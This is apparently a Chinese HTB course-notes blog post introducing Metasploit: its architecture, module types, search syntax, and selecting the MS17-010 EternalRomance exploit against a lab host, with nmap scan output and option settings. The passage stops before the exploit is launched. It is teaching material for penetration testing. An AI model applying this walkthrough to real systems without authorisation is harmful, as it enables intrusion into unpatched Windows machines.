---
title: 使用METASPLOIT框架
date: 2023-04-23 16:53:53
categories:
 - 渗透测试
 - HTB
---

# 前言

工具最近在安全行业的社交媒体圈内引起了激烈的争论。一些讨论围绕某些群体的个人偏好展开，而另一些则旨在评估向公众公开工具的政策。然而，有必要指出自动化工具在当今行业中的重要性。

我们确实听到或将要听到的普遍意见是，在安全评估期间使用自动化工具不是正确的选择。这是因为在与易受攻击的环境交互时，它们无法为安全分析师或渗透测试人员提供“证明”自己的机会。此外，许多人表示，工具使审核员的工作变得过于简单，以至于他们的评估无法获得任何认可。

另一个声音团体不同意 - 那些由信息安全社区的新成员组成的，他们刚刚开始并迈出他们的第一步，以及那些坚持认为工具通过为我们提供对过多的用户更友好的方法来帮助我们更好地学习的论点存在于野外的漏洞，同时为我们节省了评估更复杂部分的时间。我们也将采取这种对抗性的方式来处理这个问题。

在某些情况下，工具确实会给我们带来一些缺点：

- 创建一个难以突破的舒适区来学习新技能
- 仅仅因为它们在线发布供所有人查看和使用而造成安全风险
- 营造隧道视觉效果。`If the tool cannot do it, neither can I.`

​	就像在工作的创造性部分可以与自动化任务相结合的其他行业一样，工具可以限制我们作为新用户的观点和行动。我们可能错误地认为`learn`它们提供了所有问题的解决方案，我们开始越来越依赖它们。反过来，这会产生一种隧道视觉效果，这种效果可以而且将会限制用户可能会考虑并采取行动进行评估的可能交互。

​	与此同时，越来越多的这些自动化工具进入公共部门（参见美国国家安全局向公众发布安全工具）这一事实为几乎不了解这些工具的潜在恶意行为者创造了更多可能性行业根据他们快速获利的愿望采取行动，或者在充满小人物的黑暗房间里炫耀他们的努力。

## 纪律

如果要从信息安全行业的当前状态中得出任何有辨识力的因素，则必须在我们处于现有技术、协议和系统的持续、加速演进的前提下得出这些因素。由于我们在评估期间遇到大量环境变量，因此必须尽可能节省时间，并为审核员形成强大的安全范例。纪律在所有工作领域都至关重要，结论如下：

|                                                              |
| ------------------------------------------------------------ |
| 我们将永远没有足够的时间来完成评估。由于在每一种环境变化中使用的技术数量众多，我们将没有时间进行完整、全面的评估。时间就是金钱，我们为不懂技术的客户加班加点，我们需要先完成大部分工作：最具潜在影响和修复周转率最高的问题。 |
| 即使我们制作工具或手动利用每项服务，可信度也可能成为问题。我们不是与其他行业成员竞争，而是与客户管理层预先设定的经济条件和个人信念竞争。他们不会理解或非常重视荣誉。他们只希望在最短的时间内完成尽可能多的工作。 |
| 您只需要打动自己，而不是信息安全社区。如果我们做到了前者，后者自然会到来。使用与上述相同的示例，许多在线存在的艺术家在追求在线验证时偏离了最初的目标。他们的艺术对于敏锐的眼睛来说变得陈旧和普通，但对于日常用户来说，它包含了他们想要的视觉元素和主题，而不是那些他们的追随者还不知道他们想要的。作为安全研究人员或渗透测试人员，我们只需要验证漏洞，而不是验证我们的自我。 |

## 结论

我们必须从内到外分析和了解我们的工具，以保持我们的踪迹并避免在评估期间发生灾难性事件。许多工具可以证明是不可预测的。有些可能会在目标系统上留下活动痕迹，有些可能会让我们的攻击者平台敞开大门。尽管如此，只要我们遵守此处的规则，它们就可以成为初学者的宝贵教育平台，以及专业人士所需的节省时间的机制。

不要有隧道视野。将该工具用作工具，而不是我们完整评估的支柱或生命支持。

请阅读您可以找到的有关我们任何工具的所有技术文档。请深入了解他们。千方百计（或函数或类）。这将帮助我们避免意外行为或愤怒的客户和律师团队。

假设我们审核我们的工具并为自己设置一个可靠的方法来进行初步检查和攻击路径。在这种情况下，工具将为我们节省进一步研究和对我们的安全研究范式进行长期具体探索的时间。考虑到越来越多的技术出现在当今环境中的速度越来越快，这项进一步的研究应该侧重于对安全机制的更深入理解，进一步对更抽象的安全对象进行审计，以扩大分析范围。这就是我们作为专业人士的发展方式。

# Metasploit简介

​	这`Metasploit Project`是一个基于 Ruby 的模块化渗透测试平台，使您能够编写、测试和执行漏洞利用代码。该漏洞利用代码可以由用户定制，也可以从包含已发现的最新模块化漏洞利用的数据库中获取。其中`Metasploit Framework`包括一套工具，可用于测试安全漏洞、枚举网络、执行攻击和逃避检测。其核心`Metasploit Project`是一组常用工具，为渗透测试和漏洞利用开发提供了完整的环境。

![](使用METASPLOIT框架\1.png)

​	提到`modules`的是实际的漏洞利用概念验证，已经在野外开发和测试并集成在框架内，以便渗透测试人员可以轻松访问针对不同平台和服务的不同攻击向量。Metasploit 不是万事通，而是一把瑞士军刀，其工具足以帮助我们解决最常见的未修补漏洞。

​	它的强项在于它提供了大量可用的目标和版本，所有这些都离成功的立足点很远。这些，结合为那些易受攻击的版本量身定制的漏洞利用以及在漏洞利用后发送的有效负载，这将使我们能够实际访问系统，为我们提供了一种简单、自动化的方式来在我们的帖子期间在目标连接之间切换- 开发企业。

## Metasploit Pro

`Metasploit`作为一个产品分为两个版本。该`Metasploit Pro`版本与具有一些附加功能的版本不同`Metasploit Framework`：

- 任务链
- 社会工程学
- 漏洞验证
- 图形用户界面
- 快速启动向导
- 集成

如果您更喜欢命令行用户并且更喜欢额外的功能，那么专业版还包含自己的控制台，就像`msfconsole`.

要大致了解 Metasploit Pro 的最新功能可以实现什么，请查看以下列表：

| **浸润**       | **收集数据**     | **修复**     |
| -------------- | ---------------- | ------------ |
| 手动开发       | 导入和扫描数据   | 暴力破解     |
| 防病毒规避     | 发现扫描         | 任务链       |
| IPS/IDS规避    | 元模块           | 开发工作流程 |
| 代理枢轴       | Nexpose 扫描集成 | 会话重新运行 |
| 开发后         |                  | 任务回放     |
| 会话清理       |                  | 项目声纳集成 |
| 凭据重用       |                  | 会话管理     |
| 社会工程学     |                  | 凭证管理     |
| 有效载荷生成器 |                  | 团队协作     |
| 快速渗透测试   |                  | 网络界面     |
| VPN 枢轴       |                  | 备份还原     |
| 漏洞验证       |                  | 数据导出     |
| 网络钓鱼向导   |                  | 证据收集     |
| 网络应用测试   |                  | 报告         |
| 持久会话       |                  | 标记数据     |

## Metasploit 框架控制台

可能`msfconsole`是最流行的`Metasploit Framework` `(MSF)`. 它提供了一个“一体式”集中式控制台，并允许您高效地访问`MSF`. `Msfconsole`一开始可能看起来很吓人，但是一旦您了解了命令的语法，您就会学会欣赏使用此界面的强大功能。

一般带来的功能`msfconsole`有以下几点：

- 这是访问其中大部分功能的唯一受支持的方式`Metasploit`
- 提供基于控制台的界面`Framework`
- 包含最多的功能，是最稳定的`MSF`界面
- 完整的 readline 支持、制表符和命令完成
- 执行外部命令`msfconsole`

上述两种产品都带有一个广泛的可用模块数据库，可用于我们的评估。这些与外部命令（如扫描器、社会工程工具包和有效负载生成器）的使用相结合，可以将我们的设置变成一个随时可用的机器，使我们能够通过使用无缝地控制和操纵野外的不同漏洞会话和作业的方式与我们在 Internet 浏览器上看到选项卡的方式相同。

这里的关键术语是可用性——用户体验。我们可以轻松控制控制台可以改善我们的学习体验。因此，让我们深入研究细节。

## 了解架构

要完全操作我们正在使用的任何工具，我们必须首先了解它的内部结构。这是一种很好的做法，它可以让我们更好地了解当该工具发挥作用时我们的安全评估过程中会发生什么。重要的是不要使用[任何可能使您或您的客户面临数据泄露风险的通配符](https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-reported/)。

`/usr/share/metasploit-framework`默认情况下，所有与 Metasploit Framework 相关的基础文件都可以在我们的发行版中找到`ParrotOS Security`。

#### 数据、文档、库

这些是框架的基础文件。Data 和 Lib 是 msfconsole 界面的功能部分，而 Documentation 文件夹包含有关该项目的所有技术细节。

#### 模块

上面详述的模块在此文件夹中分为不同的类别。我们将在下一节中详细介绍这些内容。它们包含在以下文件夹中：

 

```shell-session
vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules

auxiliary  encoders  evasion  exploits  nops  payloads  post
```

#### 插件

插件在使用时为渗透测试人员提供了更大的灵活性，`msfconsole`因为它们可以根据需要轻松地手动或自动加载，以在我们的评估期间提供额外的功能和自动化。

 

```shell-session
vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/

aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
auto_add_route.rb  lab.rb         request.rb           thread.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb
db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
```

#### 脚本

Meterpreter 功能和其他有用的脚本。

```shell-session
vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/

meterpreter  ps  resource  shell
```

#### 工具

可以直接从菜单调用的命令行实用程序`msfconsole`。

```shell-session
vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/tools/

context  docs     hardware  modules   payloads
dev      exploit  memdump   password  recon
```

现在我们知道了所有这些位置，当我们决定导入新模块甚至从头开始创建新模块时，我们将来可以很容易地引用它们。

## MSF控制台简介

要开始与 Metasploit Framework 交互，我们需要输入`msfconsole`我们选择的终端。许多面向安全的发行版（例如 Parrot Security 和 Kali Linux）都预装了`msfconsole`。与任何其他命令行工具一样，我们可以在启动脚本时使用其他几个选项。这些从图形显示开关/选项到程序开关/选项不等。

## 准备

启动后`msfconsole`，我们会看到他们创造的启动画面和命令行提示符，等待我们的第一个命令。

~~~shell-session
nswer77@htb[/htb]$ msfconsole
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
                                              `MjM~~WE.ARE.se~~MMjMs              
                                               +~KANSAS.CITY's~-`                  
                                                J~HAKCERS~./.`                    
                                                .esc:wq!:`                        
                                                 +++ATH`                            
                                                  `


       =[ metasploit v6.1.9-dev                           ]
+ -- --=[ 2169 exploits - 1149 auxiliary - 398 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the last opened session

msf6 > 
~~~

或者，我们可以使用`-q`不显示横幅的选项。

 启动 MSF 控制台

```shell-session
vnswer77@htb[/htb]$ msfconsole -q

msf6 > 
```

为了更好地查看所有可用命令，我们可以键入命令`help`。首先，我们的工具需要锋利。我们需要做的第一件事就是确保构成框架的模块是最新的，并且可以导入任何可供公众使用的新模块。

旧方法是`msfupdate`在我们的 OS 终端（外部`msfconsole`）中运行。但是，`apt`包管理器目前可以毫不费力地处理模块和功能的更新。

#### 安装 MSF

 安装 MSF

```shell-session
vnswer77@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework

<SNIP>

(Reading database ... 414458 files and directories currently installed.)
Preparing to unpack .../metasploit-framework_6.0.2-0parrot1_amd64.deb ...
Unpacking metasploit-framework (6.0.2-0parrot1) over (5.0.88-0kali1) ...
Setting up metasploit-framework (6.0.2-0parrot1) ...
Processing triggers for man-db (2.9.1-1) ...
Scanning application launchers
Removing duplicate launchers from Debian
Launchers are updated
```

我们将在本模块中介绍的首要步骤之一是`exploit`为我们的`target`. 然而，在尝试任何利用之前，我们需要对自身有一个详细的了解`target`。这涉及`Enumeration`在任何类型的利用尝试之前的过程。

在 期间`Enumeration`，我们必须查看我们的目标并确定其上运行的是哪些面向公众的服务。例如，它是一个 HTTP 服务器吗？它是一个FTP服务器吗？它是 SQL 数据库吗？这些不同的`target`类型在现实世界中差别很大。我们需要从全面了解`scan`目标的 IP 地址开始，以确定正在运行的服务以及为每个服务安装的版本。

我们会注意到，在我们进行过程中，版本是该过程中的关键组件`Enumeration`，它将使我们能够确定目标是否易受攻击。以前易受攻击的服务的未修补版本或可公开访问的平台中的过时代码通常是我们进入系统的入口点`target`。

------

## MSF 参与结构

MSF 参与结构可分为五个主要类别。

- 枚举
- 准备
- 开发
- 特权升级
- 开发后

这种划分使我们更容易以更结构化的方式查找和选择适当的 MSF 功能，并相应地使用它们。这些类别中的每一个都有用于特定目的的不同子类别。这些包括，例如，服务验证和漏洞研究。

因此，我们熟悉这种结构至关重要。因此，我们将查看此框架的组件以更好地理解它们之间的关系。

![](使用METASPLOIT框架\2.png)

我们将在本模块中逐一介绍这些类别，但我们建议您自己查看各个组件并深入挖掘。尝试不同的功能是学习新工具或技能不可或缺的一部分。因此，我们应该在接下来的实验室中尝试所有可以想象到的东西，并独立分析结果。

## 模块

正如我们之前提到的，Metasploit`modules`是具有特定目的和相应功能的准备脚本，这些脚本已经在野外开发和测试过。该`exploit`类别由所谓的概念验证 ( `POCs`) 组成，可用于以很大程度上自动化的方式利用现有漏洞。很多人常常认为，漏洞利用的失败证明了疑似漏洞的存在。然而，这只是证明 Metasploit 漏洞不起作用，并不能证明该漏洞不存在。这是因为许多漏洞需要根据目标主机进行定制才能使漏洞发挥作用。因此，诸如 Metasploit 框架之类的自动化工具只能被视为一种支持工具，不能替代我们的手动技能。

一旦进入`msfconsole`，我们就可以从包含所有可用 Metasploit 模块的广泛列表中进行选择。它们中的每一个都被组织成文件夹，如下所示：

#### 句法

 句法

```shell-session
<No.> <type>/<os>/<service>/<name>
```

#### 例子

 例子

```shell-session
794   exploit/windows/ftp/scriptftp_list
```

#### 索引号

将显示标签`No.`以选择我们之后在搜索过程中想要的漏洞利用。稍后我们将看到`No.`标签对选择特定的 Metasploit 模块有多大帮助。

#### 类型

标签`Type`是 Metasploit 之间的第一级隔离`modules`。查看此字段，我们可以知道此模块的代码段将完成什么。例如，其中一些`types`不能像模块那样直接使用。`exploit`但是，他们将在可交互的结构旁边引入结构，以实现更好的模块化。为了更好地解释，以下是该字段中可能出现的类型：

| **类型**    | **描述**                                               |
| ----------- | ------------------------------------------------------ |
| `Auxiliary` | 扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。 |
| `Encoders`  | 确保有效负载完好无损地到达目的地。                     |
| `Exploits`  | 定义为利用允许有效载荷传递的漏洞的模块。               |
| `NOPs`      | （无操作代码）在攻击尝试中保持负载大小一致。           |
| `Payloads`  | 代码远程运行并回调攻击者机器以建立连接（或 shell）。   |
| `Plugins`   | 附加脚本可以集成在一个评估中并`msfconsole`与之共存。   |
| `Post`      | 用于收集信息、深入研究等的广泛模块。                   |

请注意，在选择用于有效载荷传输的模块时，该命令只能与以下可用作（或可交互模块）`use <no.>`的模块一起使用：`initiators`

| **类型**    | **描述**                                               |
| ----------- | ------------------------------------------------------ |
| `Auxiliary` | 扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。 |
| `Exploits`  | 定义为利用允许有效载荷传递的漏洞的模块。               |
| `Post`      | 用于收集信息、深入研究等的广泛模块。                   |

#### 操作系统

该`OS`标记指定为哪个操作系统和体系结构创建模块。自然地，不同的操作系统需要运行不同的代码以获得期望的结果。

#### servive

该`Service`标签指的是目标机器上运行的易受攻击的服务。对于某些模块，例如 the`auxiliary`或`post`ones，此标记可以指更一般的活动`gather`，例如，指的是收集凭据。

#### name

最后，`Name`标签解释了使用为特定目的创建的模块可以执行的实际操作。

## 搜索模块

Metasploit 还为现有模块提供完善的搜索功能。借助此功能，我们可以使用 specific 快速搜索所有模块，`tags`以找到适合我们目标的模块。

#### MSF - 搜索功能

```shell-session
msf6 > help search

Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.

OPTIONS:
  -h                   Show this help information
  -o <file>            Send output to a file in csv format
  -S <string>          Regex pattern used to filter search results
  -u                   Use module if there is one result
  -s <search_column>   Sort the research results based on <search_column> in ascending order
  -r                   Reverse the search results order to descending order

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

例如，我们可以尝试查找`EternalRomance`旧版 Windows 操作系统的漏洞。这可能看起来像这样：

#### MSF - 寻找永恒的浪漫

```shell-session
msf6 > search eternalromance

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution



msf6 > search eternalromance type:exploit

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

我们还可以使我们的搜索更粗略一些，并将其减少到一类服务。例如，对于 CVE，我们可以指定年份 ( `cve:<year>`)、平台 Windows ( `platform:<os>`)、我们要查找的模块类型 ( `type:<auxiliary/exploit/post>`)、可靠性等级 ( `rank:<rank>`) 和搜索名称 ( `<pattern>`)。这会将我们的结果缩减为仅符合上述所有条件的结果。

#### MSF - 特定搜索

```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
```

## 模块选择

要选择我们的第一个模块，我们首先需要找到一个。假设我们有一个目标正在运行易受 EternalRomance (MS17_010) 攻击的 SMB 版本。我们发现扫描目标时SMB服务器端口445是开放的。

 MSF - 特定搜索

```shell-session
vnswer77@htb[/htb]$ nmap -sV 10.10.10.40

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 10.10.10.40
Host is up (0.051s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds
```

我们将启动`msfconsole`并搜索这个确切的漏洞名称。

#### MSF - 搜索 MS17_010

```shell-session
msf6 > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
```

接下来，我们要为这个场景选择合适的模块。从`Nmap`扫描中，我们检测到 SMB 服务在版本 上运行`Microsoft Windows 7 - 10`。通过一些额外的操作系统扫描，我们可以猜测这是一个运行易受攻击的 SMB 实例的 Windows 7。然后我们继续选择模块以`index no. 2`测试目标是否易受攻击。

## 使用模块

在交互式模块中，我们可以指定几个选项。这些用于使 Metasploit 模块适应给定的环境。因为在大多数情况下，我们总是需要扫描或攻击不同的IP地址。因此，我们需要这种功能来设置我们的目标并对其进行微调。要检查在将漏洞发送到目标主机之前需要设置哪些选项，我们可以使用命令`show options`。在利用发生之前需要设置的所有内容都将`Yes`在该`Required`列下显示。

#### MSF - 选择模块

```shell-session
<SNIP>

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   
   
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec): 

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

在这里，我们`No.`可以看到标签有多大帮助。因为现在，我们不必在搜索中键入整个路径，而只需键入分配给 Metasploit 模块的编号。`info`如果我们想了解更多关于模块的信息，可以在选择模块后使用命令。这将为我们提供一系列对我们很重要的信息。

#### MSF - 模块信息

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   PowerShell
  2   Native upload
  3   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                          Required  Description
  ----                  ---------------                          --------  -----------
  DBGTRACE              false                                    yes       Show extra debug trace info
  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                        rdlists/named_pipes.txt
  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                           wiki/Using-Metasploit
  RPORT                 445                                      yes       The Target port (TCP)
  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                                           no        The service display name
  SERVICE_NAME                                                   no        The service name
  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                           mal read/write folder share
  SMBDomain             .                                        no        The Windows domain to use for authentication
  SMBPass                                                        no        The password for the specified username
  SMBUser                                                        no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to 
  achieve a write-what-where primitive. This will then be used to 
  overwrite the connection session information with as an 
  Administrator session. From there, the normal psexec payload code 
  execution is done. Exploits a type confusion between Transaction and 
  WriteAndX requests and a race condition in Transaction requests, as 
  seen in the EternalRomance, EternalChampion, and EternalSynergy 
  exploits. This exploit chain is more reliable than the EternalBlue 
  exploit, but requires a named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE
```

在我们对所选模块适合我们的目的感到满意之后，我们需要设置一些规范来自定义模块以成功地针对我们的目标主机使用它，例如设置目标（或`RHOST`）`RHOSTS`。

#### MSF - 目标规范

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

此外，还有一个选项`setg`，它指定我们选择的选项在程序重新启动之前是永久的。因此，如果我们在特定的目标主机上工作，我们可以使用此命令设置 IP 地址一次，并且在我们将焦点转移到不同的 IP 地址之前不再更改它。

#### MSF - 永久目标规范

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
